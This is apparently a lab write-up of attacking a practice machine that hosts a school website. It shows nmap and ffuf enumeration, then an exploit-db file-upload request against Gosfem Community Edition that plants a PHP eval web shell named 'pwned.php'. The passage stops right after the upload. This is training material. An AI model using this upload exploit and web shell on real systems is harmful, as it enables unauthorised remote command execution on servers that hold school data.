## First enumeration with nmap

```shell
# Nmap 7.94SVN scan initiated Tue Feb 20 15:05:34 2024 as: nmap -sC -sV -T4 -oN service.nmap -p 22,80 -Pn 192.168.239.13
Nmap scan report for 192.168.239.13
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Wisdom Elementary School
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb 20 15:05:46 2024 -- 1 IP address (1 host up) scanned in 11.60 seconds
```

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/6aeecc46-9953-426f-929e-7c8b65b6c42c)

a web server is running on port `80`, openning it on a browser, we got a we school webpage. 

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Educated]
└─$ ffuf -ic -u "http://192.168.239.13/FUZZ" -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -fc 404,500,400 -e .txt,.php,.asp,.aspx,.old,.pd
f -fs 0                                                                       
                                                                              
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/        
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\       
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\        
          \/_/    \/_/   \/___/    \/_/         

       v1.5.0-dev         
________________________________________________ 
                                                                                                                                                            
 :: Method           : GET                                                    
 :: URL              : http://192.168.239.13/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 :: Extensions       : .txt .php .asp .aspx .old .pdf 
 :: Follow redirects : false
 :: Calibration      : false                                                  
 :: Timeout          : 10                                                     
 :: Threads          : 40                                                     
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 404,500,400
 :: Filter           : Response size: 0                                                                                                                     
________________________________________________                                                                                                            
                                                                                                                                                            
.php                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 125ms]
                        [Status: 200, Size: 23698, Words: 7065, Lines: 559, Duration: 129ms]
assets                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 6187ms]
management              [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 124ms]
vendor                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 126ms]
```
fuzzing for hidden dirs, we got the above 

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Educated]                                                                                                    
└─$ ffuf -ic -u "http://192.168.239.13/management/FUZZ" -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -fc 404,500,400 -e .txt,.php,.asp,.as
px,.old,.pdf -fs 0                                                             
                                                                              
        /'___\  /'___\           /'___\         
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                                                    
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                                                    
         \ \_\   \ \_\  \ \____/  \ \_\                                                                                                                     
          \/_/    \/_/   \/___/    \/_/                                                                                                                     
                                                                                                                                                            
       v1.5.0-dev                                                                                                                                           
________________________________________________                                                                                                            
                                                                                                                                                            
 :: Method           : GET                                                                                                                                  
 :: URL              : http://192.168.239.13/management/FUZZ                                                                                                
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt                                                                    
 :: Extensions       : .txt .php .asp .aspx .old .pdf                                                                                                       
 :: Follow redirects : false                                                                                                                                
 :: Calibration      : false                                                                                                                                
 :: Timeout          : 10                                                                                                                                   
 :: Threads          : 40                                                                                                                                   
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500                                                                                 
 :: Filter           : Response status: 404,500,400                                                                                                         
 :: Filter           : Response size: 0                                                                                                                     
________________________________________________                                                                                                            
                                                                                                                                                            
.php                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 127ms]    
                        [Status: 200, Size: 6374, Words: 828, Lines: 125, Duration: 146ms]
index.php               [Status: 200, Size: 6374, Words: 828, Lines: 125, Duration: 2144ms]
login                   [Status: 200, Size: 6374, Words: 828, Lines: 125, Duration: 135ms]
uploads                 [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 124ms]
assets                  [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 126ms]   
system                  [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 125ms]
Login                   [Status: 200, Size: 6374, Words: 828, Lines: 125, Duration: 138ms]
README                  [Status: 200, Size: 66, Words: 8, Lines: 1, Duration: 121ms]
README.txt              [Status: 200, Size: 66, Words: 8, Lines: 1, Duration: 120ms]
js                      [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 128ms]
dist                    [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 127ms]
application             [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 125ms]
installation            [Status: 301, Size: 334, Words: 20, Lines: 10, Duration: 120ms]
```

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/06237ce1-19da-465d-8b66-9f43b3895685)

checking the login dir, we got to see the service name `Gosfem Community Edition`.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/ecb7fef4-925e-4baa-9f8f-86b8d907cbd3)

after wsome research, found an exploit on exploitdb, [exploit](https://www.exploit-db.com/exploits/50587)

```
POST /management/admin/examQuestion/create HTTP/1.1
Host: 192.168.165.13
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------183813756938980137172117669544
Content-Length: 1331
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1

-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="name"

test4
-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="class_id"

2
-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="subject_id"

5
-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="timestamp"

2021-12-08
-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="teacher_id"

1
-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="file_type"

txt
-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="status"

1
-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="description"

123123
-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="_wysihtml5_mode"

1
-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="file_name"; filename="pwned.php"
Content-Type: application/octet-stream

<?php eval($_GET["cmd"]); ?>
-----------------------------183813756938980137172117669544--
```
made modification to the exploit and uploaded the web shell. 

